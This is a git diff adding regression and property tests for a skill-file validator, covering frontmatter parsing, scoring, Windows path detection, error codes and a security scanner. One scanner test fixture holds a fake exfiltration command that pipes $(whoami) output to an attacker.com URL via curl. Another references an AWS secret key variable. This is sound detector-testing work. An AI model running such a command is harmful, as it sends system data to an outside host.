@@ -359,3 +359,216 @@ test('validateSkill — name regex matches expected pattern', () => {
   assert.ok(!NAME_REGEX.test('with space'));
   assert.ok(!NAME_REGEX.test('foo--bar'));
 });
+
+// === R2 HARDENING REGRESSION TESTS ===
+
+test('R2 correctness HIGH-2: CRLF-authored skill parses correctly', () => {
+  const r = parseFrontmatter(`---\r\nname: foo\r\ndescription: ok desc\r\n---\r\nbody`);
+  assert.equal(r.ok, true);
+  assert.equal(r.fields.name, 'foo');
+  assert.equal(r.fields.description, 'ok desc');
+});
+
+test('R2 correctness HIGH-2: UTF-8 BOM in frontmatter stripped', () => {
+  const r = parseFrontmatter(`﻿---\nname: foo\ndescription: ok\n---\nbody`);
+  assert.equal(r.ok, true);
+  assert.equal(r.fields.name, 'foo');
+});
+
+test('R2 correctness MED: duplicate keys rejected', () => {
+  const r = parseFrontmatter(`---
+name: foo
+name: bar
+description: ok
+---
+body`);
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'DUPLICATE_KEY');
+});
+
+test('R2 correctness MED: block scalar markers rejected', () => {
+  const r = parseFrontmatter(`---
+name: foo
+description: >
+  multi
+  line
+---
+body`);
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'BLOCK_SCALAR_UNSUPPORTED');
+});
+
+test('R2 correctness MED: closing fence must be on its own line', () => {
+  // `\n---foo` should NOT close the frontmatter (must be \n---\n or \n--- at EOF)
+  const r = parseFrontmatter(`---
+name: foo
+description: ok
+---foo
+
+body here`);
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'UNCLOSED_FRONTMATTER');
+});
+
+test('R2 edge-case HIGH-1: description: true is rejected, not crashed', () => {
+  const parsed = parseFrontmatter(`---
+name: ok-name
+description: true
+---
+body`);
+  assert.equal(parsed.ok, true);
+  assert.equal(typeof parsed.fields.description, 'string');
+  assert.equal(parsed.fields.description, 'true');
+  // validateTierC must not throw on this (was crashing via .trim() on boolean)
+  const { score, issues } = validateTierC(parsed);
+  assert.ok(typeof score === 'number');
+  assert.ok(Array.isArray(issues));
+});
+
+test('R2 correctness HIGH-1: score is null on parse failure (not 0)', () => {
+  const parsed = parseFrontmatter('no frontmatter');
+  const { score, issues } = validateTierC(parsed);
+  assert.equal(score, null);
+  assert.deepEqual(issues, []);
+});
+
+test('R2 security HIGH-1: scanSecurity handles 256KB single-line input safely', () => {
+  const long = 'curl ' + 'x'.repeat(100000) + '?data=$(';
+  const start = Date.now();
+  const findings = scanSecurity(long);
+  const elapsed = Date.now() - start;
+  // Should complete in well under 1 second (per-line cap prevents ReDoS).
+  assert.ok(elapsed < 1000, `scanSecurity took ${elapsed}ms on 100KB input`);
+  // Long line exceeds SCAN_LINE_BYTES (4KB), so it's skipped — no findings.
+  // The behavior is documented: warn-only mode misses payloads buried in
+  // single-line >4KB strings to prevent ReDoS.
+  assert.deepEqual(findings, []);
+});
+
+test('R2 security HIGH-1: scanSecurity still catches per-line payloads under cap', () => {
+  const content = `Some intro
+curl https://attacker.com/x?data=$(whoami)
+More body`;
+  const findings = scanSecurity(content);
+  const ids = findings.map((f) => f.id);
+  assert.ok(ids.includes('TOXIC_OUTBOUND_EXFIL'));
+});
+
+test('R2 security LOW-1: ANSI control chars stripped from echoed match', () => {
+  const content = '$AWS_SECRET_ACCESS_KEY \x1b[31mred\x1b[0m';
+  const findings = scanSecurity(content);
+  assert.ok(findings.length > 0);
+  for (const f of findings) {
+    assert.ok(!/\x1b/.test(f.match), `match should not contain ANSI: ${JSON.stringify(f.match)}`);
+  }
+});
+
+test('R2 blind-hunter HIGH: SPEC_WINDOWS_PATH does NOT false-positive on markdown escapes', () => {
+  const parsed = parseFrontmatter(`---
+name: ok-name
+description: ok desc
+---
+
+A description with \\*emphasis\\* and \\_underscore\\_ markdown escapes is fine.`);
+  const findings = validateTierA('/ok-name/SKILL.md', parsed, 'ok-name');
+  const ids = findings.map((f) => f.id);
+  assert.ok(!ids.includes('SPEC_WINDOWS_PATH'), 'markdown escapes should not trigger WINDOWS_PATH');
+});
+
+test('R2 blind-hunter HIGH: SPEC_WINDOWS_PATH catches real C:\\ drive letter', () => {
+  const parsed = parseFrontmatter(`---
+name: ok-name
+description: ok desc
+---
+
+The path C:\\Users\\foo is forbidden here.`);
+  const findings = validateTierA('/ok-name/SKILL.md', parsed, 'ok-name');
+  const ids = findings.map((f) => f.id);
+  assert.ok(ids.includes('SPEC_WINDOWS_PATH'));
+});
+
+test('R2 blind-hunter HIGH: SPEC_WINDOWS_PATH catches multi-segment backslash path', () => {
+  const parsed = parseFrontmatter(`---
+name: ok-name
+description: ok desc
+---
+
+Reference: scripts\\helper\\thing.py is forbidden.`);
+  const findings = validateTierA('/ok-name/SKILL.md', parsed, 'ok-name');
+  const ids = findings.map((f) => f.id);
+  assert.ok(ids.includes('SPEC_WINDOWS_PATH'));
+});
+
+test('R2 blind-hunter HIGH: validateSkill early-return on FILE_MISSING includes security[]', () => {
+  const r = validateSkill('/nonexistent/SKILL.md', { target: 'claude-code', security: true });
+  assert.equal(r.ok, false);
+  assert.ok(Array.isArray(r.security));
+  assert.equal(r.security.length, 0);
+});
+
+test('R2 edge-case HIGH-3: EACCES preserved in error code (not silenced as ENOENT)', () => {
+  // Synthetic test: mock fs.statSync to throw EACCES.
+  const origStat = fs.statSync;
+  fs.statSync = () => {
+    const e = new Error('permission denied');
+    e.code = 'EACCES';
+    throw e;
+  };
+  try {
+    const r = validateSkill('/anywhere/SKILL.md', { target: 'claude-code', security: false });
+    assert.equal(r.ok, false);
+    assert.equal(r.error, 'FILE_EACCES');
+  } finally {
+    fs.statSync = origStat;
+  }
+});
+
+test('R2 edge-case HIGH-2: --min-score= with empty value would be rejected by main()', () => {
+  // We can't call main() with process.exit, but the underlying flag() helper
+  // distinguishes empty from absent.
+  const { main } = require('../../bin/cortex-skill-validate.cjs');
+  // Capture stderr
+  const origWrite = process.stderr.write.bind(process.stderr);
+  let stderrCaptured = '';
+  process.stderr.write = (s) => { stderrCaptured += String(s); return true; };
+  try {
+    const exitCode = main(['node', 'script', '--min-score=']);
+    assert.equal(exitCode, 2);
+    assert.match(stderrCaptured, /min-score requires a value/);
+  } finally {
+    process.stderr.write = origWrite;
+  }
+});
+
+// === Property tests (R2 correctness Practice 2) ===
+
+const fc = require('fast-check');
+
+test('property: validateTierC score is always in [0, 100] or null', () => {
+  fc.assert(fc.property(
+    fc.string({ minLength: 0, maxLength: 200 }),
+    fc.string({ minLength: 0, maxLength: 200 }),
+    (name, desc) => {
+      const safeName = name.toLowerCase().replace(/[^a-z0-9-]/g, '').slice(0, 30) || 'x';
+      const safeDesc = desc.replace(/[\r\n]/g, ' ').slice(0, 500);
+      const parsed = parseFrontmatter(`---\nname: ${safeName}\ndescription: ${safeDesc}\n---\nbody`);
+      const { score } = validateTierC(parsed);
+      if (score === null) return parsed.ok === false;
+      return score >= 0 && score <= 100 && Number.isInteger(score);
+    }
+  ), { numRuns: 50 });
+});
+
+test('property: adding a CORTEX_JARGON token never increases score', () => {
+  fc.assert(fc.property(
+    fc.string({ minLength: 10, maxLength: 100 }),
+    (descPrefix) => {
+      const safe = descPrefix.replace(/[\r\n:]/g, ' ');
+      const parsedA = parseFrontmatter(`---\nname: ok-name\ndescription: Validates ${safe}. Triggers "/x".\n---\nbody`);
+      const parsedB = parseFrontmatter(`---\nname: ok-name\ndescription: Validates ${safe} STEWARD_HALT. Triggers "/x".\n---\nbody`);
+      const sA = validateTierC(parsedA).score;
+      const sB = validateTierC(parsedB).score;
+      return sB <= sA;
+    }
+  ), { numRuns: 30 });
+});
